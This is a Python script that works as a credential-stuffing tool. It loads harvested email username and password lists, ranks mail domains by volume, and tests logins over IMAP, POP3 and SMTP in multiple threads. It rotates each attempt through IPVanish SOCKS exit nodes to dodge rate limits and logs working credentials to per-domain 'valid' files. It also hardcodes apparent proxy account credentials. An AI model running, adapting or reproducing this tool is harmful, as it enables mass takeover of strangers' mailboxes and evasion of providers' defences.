#!/usr/bin/env python3
"""
check_top6_rotation.py — multithreaded, proxy-rotating probe of the top-N mail
domains (by credential volume). Writes SEPARATE valid/fail logs per domain and
keeps probing each domain until it hits a target number of valid creds.

- Proxy rotation: cycles through IPvanish SOCKS city subdomains, one exit IP
  per connection, so balancing offsets across probes. Reuses the IPvanish
  account credentials already configured for the repo.
- Progress is drawn live in the terminal (single in-place status line, updated
  every --refresh seconds); VALID hits are printed as they land.
- End condition: a domain stops when it reaches --target, or its credentials
  run out. The run ends when every domain has either reached its target or
  spent all its creds.

Usage:
    python3 check_top6_rotation.py --dirs <classified_or_cleaned>...
    python3 check_top6_rotation.py --top 6 --target 5 --workers 8 --max-per-domain 3000
    python3 check_top6_rotation.py --hosts smtp.office365.com,mail.google.com --out logs
"""

import argparse
import imaplib
import poplib
import smtplib
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

try:
    import socks
except ImportError:  # pragma: no cover
    socks = None

import check_top_mail_servers as cms
from urllib.parse import urlparse as _urlparse

# Working rotation base: IPvanish SOCKS city subdomains. Same account creds
# work on each city, and each city resolves to a different exit IP, so cycling
# them is the rotation. Replace with your own IP list via --proxies FILE
# (one 'ip:port' per line) if you prefer a datacenter list.
PROXY_USERNAME = "aFZPGm3WgPg4"
PROXY_PASSWORD = "MGQoj7uVjDrw"
_IPVANE_CITIES = [
    "nyc", "chi", "mia", "atl", "dal", "den", "phx", "sj", "la", "sea",
    "fra", "ams", "lon", "mad", "bcn", "par", "mil", "vie", "zrh", "ath",
    "tor", "van", "bos", "sfo", "was",
]
PROXY_POOL = [(f"{c}.socks.ipvanish.com", 1080) for c in _IPVANE_CITIES]


def _parse_socks_url(url: str):
    p = _urlparse(url)
    return {
        "host": p.hostname,
        "port": p.port or 1080,
        "username": p.username,
        "password": p.password,
    }


def proxy_pool(proxy_url: str = None, proxies_file: str = None,
               user: str = PROXY_USERNAME, password: str = PROXY_PASSWORD):
    """Rotation pool as [(host, port, user, passwd)].
    - proxy_url: socks5://user:pass@host:port (single, credentials embedded)
    - proxies_file: lines of 'ip:port' rotated with the given creds
    - default: rotates the built-in PROXY_POOL."""
    if proxy_url:
        base = _parse_socks_url(proxy_url)
        return [(base["host"], base["port"], base["username"], base["password"])]
    nodes = PROXY_POOL
    if proxies_file:
        nodes = []
        for line in Path(proxies_file).read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if ":" in line:
                h, p = line.rsplit(":", 1)
                nodes.append((h, int(p) if p.isdigit() else 1080))
    return [(h, p, user, password) for h, p in nodes]


def verify_pool(nodes, timeout=8, check_host="imap.mail.com", check_port=993):
    """Return nodes that relay real IMAP traffic: SOCKS5 negotiate + TLS connect
    + an IMAP line echoed back. Threaded probe (fast)."""
    import errno
    import ssl as _ssl
    def _probe(node):
        host, port, user, pw = node
        try:
            s = socks.socksocket()
            s.settimeout(timeout)
            if user:
                s.set_proxy(socks.SOCKS5, host, port, rdns=True, username=user, password=pw)
            else:
                s.set_proxy(socks.SOCKS5, host, port, rdns=True)
            s.connect((check_host, check_port))
            t = _ssl.create_default_context().wrap_socket(s, server_hostname=check_host)
            t.sendall(b"a1 CAPABILITY\r\n")
            data = t.recv(64)
            t.close()
            return b"CAPABILITY" in data  # real IMAP server greeted us
        except Exception:
            return False
    with ThreadPoolExecutor(max_workers=min(len(nodes) or 1, 64)) as ex:
        live = [n for n, ok in zip(nodes, ex.map(_probe, nodes)) if ok]
    return live


# ---- per-thread proxy injection (no global monkey-patch race) ----
_tls = threading.local()


def _sock_factory(*args, **kwargs):
    s = socks.socksocket(*args, **kwargs)
    p = getattr(_tls, "proxy", None)
    if p:
        city, port, user, pw = p
        s.set_proxy(socks.SOCKS5, city, port, rdns=True, username=user, password=pw)
    return s


if socks is not None:
    socket.socket = _sock_factory


def _check(proto, host, port, user, pw, timeout, proxy):
    """Return (ok, short_msg). Uses the per-thread proxy for this attempt."""
    _tls.proxy = proxy
    try:
        if proto == "imap":
            with imaplib.IMAP4_SSL(host, port, timeout=timeout) as c:
                c.login(user, pw)
        elif proto == "pop3":
            c = poplib.POP3_SSL(host, port, timeout=timeout)
            try:
                c.user(user)
                c.pass_(pw)
            finally:
                c.quit()
        else:  # smtp
            with smtplib.SMTP(host, port, timeout=timeout) as c:
                c.ehlo()
                c.starttls()
                c.ehlo()
                c.login(user, pw)
        return True, "ok (%s:%s)" % (proxy[0], proxy[1])
    except (imaplib.IMAP4.error, poplib.error_proto,
            smtplib.SMTPAuthenticationError) as e:
        return False, "auth:%s" % type(e).__name__
    except (OSError, smtplib.SMTPException) as e:
        return False, "transport:%s" % type(e).__name__
    finally:
        _tls.proxy = None


class Domain:
    def __init__(self, name, protocol, host, port, creds, valid_target, outdir):
        self.name = name
        self.protocol = protocol
        self.host = host
        self.port = port
        self.creds = list(creds)
        self.target = valid_target
        self.valid = 0
        self.scanned = 0
        self.fail = 0
        self.done = False
        self.reached = False
        self.valid_file = open(outdir / f"{name}.valid.log", "w", encoding="utf-8")
        self.fail_file = open(outdir / f"{name}.fail.log", "w", encoding="utf-8")

    def record(self, user, pw, ok, msg):
        if ok:
            self.valid += 1
            self.valid_file.write(f"{self.host}:{user}:{pw}\n")
            self.valid_file.flush()
            if self.valid >= self.target:
                self.done = True
                self.reached = True
        else:
            self.fail += 1
            self.fail_file.write(f"{self.host}:{user}:{pw} # {msg}\n")
            self.fail_file.flush()

    def close(self):
        self.valid_file.close()
        self.fail_file.close()


class Rotator:
    """Round-robins domains and their creds; returns None when all are done."""

    def __init__(self, domains, per_domain_budget):
        self.domains = domains
        self.idx = 0
        self.remaining = {d.name: min(len(d.creds), per_domain_budget or 1 << 30)
                          for d in domains}
        self.lock = threading.Lock()

    def next(self):
        with self.lock:
            for _ in range(len(self.domains)):
                d = self.domains[self.idx]
                self.idx = (self.idx + 1) % len(self.domains)
                if d.done:
                    continue
                i = d.scanned
                if i >= self.remaining[d.name]:
                    d.done = True
                    continue
                d.scanned += 1
                return d, i
            return None


def build_domains(hosts, by_host, outdir, target, budget):
    out = []
    for name in hosts:
        creds = by_host.get(name, [])
        proto = None
        h = name
        if name.startswith("smtp"):
            proto, h = "smtp", cms.imap_host_of(name)
        elif name.startswith("pop"):
            proto, h = "pop3", name
        else:
            proto, h = "imap", cms.imap_host_of(name)
        out.append(Domain(name, proto, h,
                          creds[0]["port"] if creds else 0,
                          [(x["user"], x["password"]) for x in creds],
                          target, outdir))
    return out


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dirs", default=",".join(cms.DEFAULT_DIRS))
    ap.add_argument("--hosts", help="explicit comma list of host domains (skips ranking)")
    ap.add_argument("--top", type=int, default=6)
    ap.add_argument("--target", type=int, default=5)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--max-per-domain", type=int, default=5000)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--retries", type=int, default=2, help="re-try transport errors on a different proxy before logging a fail")
    ap.add_argument("--log-dir", default="logs")
    ap.add_argument("--proxy", default=None, help="socks5://user:pass@host:port (single, creds embedded)")
    ap.add_argument("--proxies", default=None, help="file of 'ip:port' lines rotated with built-in creds")
    ap.add_argument("--proxy-creds", default=f"{PROXY_USERNAME}:{PROXY_PASSWORD}", help="user:pass for rotated IP pool")
    args = ap.parse_args()

    if socks is None:
        sys.exit("PySocks required: pip install pysocks")
    dirs = [d for d in args.dirs.split(",") if Path(d).is_dir()]
    if not dirs:
        sys.exit("no valid --dirs")

    cu, cp = (args.proxy_creds.split(":", 1) if ":" in args.proxy_creds
              else (PROXY_USERNAME, PROXY_PASSWORD))
    probes = proxy_pool(args.proxy, args.proxies, cu, cp)
    print(f"probing {len(probes)} proxy nodes for a live IMAP relay...")
    live = verify_pool(probes, timeout=args.timeout)
    proxies = live or probes
    print(f"proxy rotation: {len(live)}/{len(probes)} nodes live (e.g. {proxies[0][0]}:{proxies[0][1]})")
    if not live:
        print("WARNING: no LIVE proxy node relays IMAP — checks will fail-fast. "
              "Refresh the list (--proxies FILE, ip:port per line) or fix creds.", file=sys.stderr)
    print("ranking by volume...")
    by_host, vol = cms.collect(dirs)

    if args.hosts:
        hosts = [h.strip() for h in args.hosts.split(",") if h.strip()]
    else:
        hosts = [h for h, _ in vol.most_common(args.top)]
    print(f"domains:" + "".join(f"\n  {h}  ({vol[h] if h in vol else len(by_host.get(h,[]))} creds)" for h in hosts))

    outdir = Path(args.log_dir)
    outdir.mkdir(parents=True, exist_ok=True)
    domains = build_domains(hosts, by_host, outdir, args.target, args.max_per_domain)
    rot = Rotator(domains, args.max_per_domain)
    lock = threading.Lock()

    # live progress drawer
    stop_draw = threading.Event()
    def draw():
        while not stop_draw.is_set():
            parts = []
            for d in domains:
                state = "DONE" if d.done else "run"
                parts.append(f"{d.name}: s={d.scanned} v={d.valid}/{d.target} f={d.fail} [{state}]")
            with lock:
                sys.stdout.write("\r\033[K" + "  ".join(parts))
                sys.stdout.flush()
            stop_draw.wait(5)
    drawer = threading.Thread(target=draw, daemon=True)
    drawer.start()

    def worker():
        while True:
            got = rot.next()
            if got is None:
                return
            d, i = got
            user, pw = d.creds[i]
            first_proxy_i = i % len(proxies)
            ok, msg = False, "transport"
            for attempt in range(args.retries + 1):
                proxy = proxies[(first_proxy_i + attempt) % len(proxies)]
                ok_, msg_ = _check(d.protocol, d.host, d.port, user, pw, args.timeout, proxy)
                ok, msg = ok_, msg_
                if ok or not msg_.startswith("transport:"):
                    break
            d.record(user, pw, ok, msg)
            if ok:
                with lock:
                    sys.stdout.write(f"\r\033[K[VALID {d.name}] {user} @ {d.host} via {proxy[0]}\n")
                    sys.stdout.flush()
            if d.reached:
                with lock:
                    sys.stdout.write(f"\r\033[K[DONE  {d.name}] reached {d.target} valid\n")
                    sys.stdout.flush()

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.workers)]
    t0 = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    stop_draw.set()
    drawer.join()
    print("\n" + "=" * 50)
    for d in domains:
        status = "OK" if d.reached else "EXHAUSTED"
        print(f"  {status} {d.name}: valid={d.valid} scanned={d.scanned} failed={d.fail} "
              f"-> {d.valid_file.name.replace('.valid.log','')}.{{valid,fail}}.log")
    print(f"elapsed {time.time() - t0:.1f}s across {args.workers} threads")


if __name__ == "__main__":
    main()